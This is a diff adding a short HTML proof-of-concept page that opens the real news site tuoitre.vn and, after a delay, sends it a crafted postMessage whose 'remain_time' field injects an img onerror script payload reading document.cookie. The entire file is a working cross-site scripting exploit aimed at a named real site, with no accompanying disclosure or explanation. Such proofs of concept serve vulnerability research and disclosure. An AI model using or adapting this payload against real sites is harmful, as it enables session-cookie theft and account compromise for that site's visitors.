@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <button id="test">Click here</button>
+    <script>
+    function poc() {
+        var w = window.open("https://tuoitre.vn")
+        setTimeout(function(){w.postMessage({'act':'popup','id':'errorForm','remain_time':'<img src=x onerror=alert(document.cookie)>'},'*');}, 2000);
+    };
+    document.getElementById("test").addEventListener("click", poc);  
+    </script>
+</body>
+</html>
